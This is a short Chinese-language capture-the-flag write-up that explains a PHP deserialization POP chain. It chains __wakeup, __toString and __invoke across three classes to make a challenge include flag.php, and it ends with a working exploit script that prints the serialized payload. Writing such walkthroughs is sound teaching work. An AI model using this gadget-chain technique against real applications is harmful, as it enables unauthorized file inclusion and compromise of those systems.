# WriteUP · Level 16


第一个真正意义上的POP链，这里涉及到了三个我们在前面学过的魔术方法：

- `__wakeUp()` 方法用于反序列化时自动调用。例如 unserialize()。
- `__invoke()` 方法用于一个对象被当成函数时应该如何回应。例如 $obj() 应该显示些什么。
- `__toString()` 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。

同样的我们先找终点 ——

```PHP
class A {
    public $a;
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}
```

很明显终点也需要一些更改：$this->a 的值要为 flag.php

然后查找，哪里有函数调用相关的类：

```PHP
class B {
    public $b;
    public function __toString() {
        return ($this->b)();
    }
}
```

那么让 $b = new A() 即可。

接下来就是触发 __toString() ，那么向上查找打印相关的函数 ——

```PHP
class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}
```

至此写出链子 INIT->name-->B->b->A->a，EXP:

```PHP
class A {
    public $a='flag.php';
}

class B {
    public $b;
}

class INIT {
    public $name;
}

$a = new A();
$b = new B();
$b->b = $a;
$init = new INIT();
$init->name  = $b;

echo urlencode(serialize($init));
```

